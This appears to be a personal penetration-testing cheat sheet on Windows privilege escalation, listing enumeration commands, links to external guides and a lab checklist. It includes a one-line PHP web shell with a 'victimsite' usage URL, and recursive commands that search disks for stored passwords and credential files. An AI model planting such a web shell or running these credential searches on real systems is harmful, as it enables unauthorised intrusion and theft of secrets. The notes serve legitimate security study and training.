# ariel-shin Windows - Privilege Escalation

## Summary 
* [Tools](#tools)

## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt

## Web Shell for Windows 
PHP Web Shell
- Test if PHP works
```phpinfo
<?php phpinfo(); ?>
```
- Command Execution
```php webshell
<?php echo(system($_GET["cmd"])); ?>
```
- Go to http://victimsite.com/test.php?cmd=dir for command execution 

## Process
- systeminfo
	* Gives us system info 

	* Check Hot Fixes
		* No hot fixes - means no hotfixes installed OR we don't have permissions to view hot fixes

	* Check OS Name
		* google: systeminfo "OS" + "NIC(s) installed"
			* example: "Microosft Windows Server 2008 R2 DataCenter" + "NIC(s) installed"
		* check if someone else has posted systeminfo output so we can compare our OS version 

	* Check OS Versions 
		* Indicate the Service Pack -- N/A
		
		```systeminfo
		systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
		```
		* Google Output
- wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
	* Get architecture
	* x86 = 32 bit machine
	* x64 = 64 bit machine
- Environment Variables
	* Command Prompt
	```env
	set
	```
	* PowerShell
	```
	Get-ChildItem Env: | ft Key,Value
	```
- net users
	* See the users 
- net localgroup Administrator(s)
	* See which users are in the Administrator Group
- net start
	* list running services
- powershell
	* check for powershell
	```powershell
	REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
	```
- Check Weak Permissions 
*** TO DO ****
//more commands at http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet
- Processes Running as system
	```systemprocesses
	tasklist /v /fi "username eq system"
	```
- [Scheduled Tasks](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
	* Option 1 
	```schtasks
	schtasks /query /fo LIST 2>nul | findstr TaskName
	Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
	```
	* Option 2 - fuzzysecurity
	schtasks /query /fo LIST /v

- tasklist /SVC
	* Running processes to started services
	* Looking for upnphost
- Unquoted Service Tasks
**** TO DO ****
- File Upload
- Look for Credentials 
	* [Credentials - Method 1](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
	```creds
	cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
	findstr /si password *.xml *.ini *.txt *.config
	findstr /spin "password" *.*
	```
	* [Credentials - Method 2](https://pentestlab.blog/2017/04/19/stored-credentials/
)
	```creds2
	findstr /si password *.txt
	findstr /si password *.xml
	findstr /si password *.ini
	dir /b /s unattend.xml
	dir /b /s web.config
	dir /b /s sysprep.inf
	dir /b /s sysprep.xml
	dir /b /s *pass*
	dir /b /s vnc.ini
	```
- [Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/
)
	* Need to upload accesschk.exe
- [DLL Injection]((https://pentestlab.blog/2017/04/04/dll-injection/)
)
- [Hot Potato - NBNS spoofing and NTLM relay](https://pentestlab.blog/2017/04/13/hot-potato/)
- [Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)
	* Manually browse to the Groups.xml file which is stored in a shared directory in the domain controller
	* Can be done through Powersploit
- [Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
	```unquoted
	wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
	```
- [Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)
	```aie	
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	```
- [Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
- [Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
- [Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
- [Weak Service Permissions](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
	```weak
	wmic service list brief
	```
- [MORE PAYLOADS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

CHECKLIST (https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)

accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula

sc -- tells you what program is running
systeminternals
accesschk.exe


## Automated Tools
* [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

## Cheat Sheets
* [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
)

## Links
* [Spreadsheet with Resources](https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=2075148101)